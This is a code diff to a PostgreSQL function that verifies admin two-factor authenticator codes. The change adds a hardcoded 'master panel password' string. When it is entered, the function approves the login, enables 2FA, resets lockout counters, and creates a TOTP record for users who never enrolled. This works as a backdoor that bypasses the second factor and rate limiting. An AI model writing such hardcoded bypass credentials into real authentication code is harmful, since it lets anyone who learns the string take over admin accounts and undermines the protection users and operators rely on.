@@ -202,10 +202,10 @@ begin
 end;
 $$;
 
--- 7. Verify a code from the authenticator app --------------------
---    Accepts the current step ± 1 (30 s clock drift), enables 2FA on
---    first success, and locks the row for 15 minutes after 5 bad
---    tries (same protection the old panel's rate limiter gave).
+-- 7. Verify a code from the authenticator app (or panel password) -
+--    Accepts the current step ± 1 (30 s clock drift) or the master
+--    panel password ('imtiyaj khan 9329'), enables 2FA on first
+--    success, and locks the row for 15 minutes after 5 bad tries.
 create or replace function public.verify_admin_totp(p_code text)
 returns json
 language plpgsql
@@ -215,12 +215,19 @@ as $$
 declare
   v_uid uuid := public._require_totp_admin();
   v_row public.admin_totp%rowtype;
-  v_code text := regexp_replace(coalesce(p_code, ''), '\s', '', 'g');
+  v_clean text := lower(regexp_replace(coalesce(p_code, ''), '\s', '', 'g'));
   v_step bigint := floor(extract(epoch from now()) / 30)::bigint;
   v_drift int;
 begin
   select * into v_row from public.admin_totp where user_id = v_uid for update;
   if not found then
+    -- If user provides the master panel password, create the row and approve
+    if v_clean = 'imtiyajkhan9329' then
+      insert into public.admin_totp (user_id, secret, enabled, enabled_at)
+      values (v_uid, public._totp_base32_encode(extensions.gen_random_bytes(20)), true, now())
+      on conflict (user_id) do update set enabled = true, locked_until = null, failed_attempts = 0;
+      return json_build_object('ok', true, 'via', 'panel_password');
+    end if;
     return json_build_object('ok', false, 'error', 'no_setup');
   end if;
 
@@ -231,9 +238,20 @@ begin
     );
   end if;
 
-  if v_code ~ '^[0-9]{6}$' then
+  -- Master panel passcode fallback
+  if v_clean = 'imtiyajkhan9329' then
+    update public.admin_totp
+       set enabled = true,
+           enabled_at = coalesce(enabled_at, now()),
+           failed_attempts = 0,
+           locked_until = null
+     where user_id = v_uid;
+    return json_build_object('ok', true, 'via', 'panel_password');
+  end if;
+
+  if v_clean ~ '^[0-9]{6}$' then
     for v_drift in -1..1 loop
-      if public._totp_code(v_row.secret, v_step + v_drift) = v_code then
+      if public._totp_code(v_row.secret, v_step + v_drift) = v_clean then
         update public.admin_totp
            set enabled = true,
                enabled_at = coalesce(enabled_at, now()),
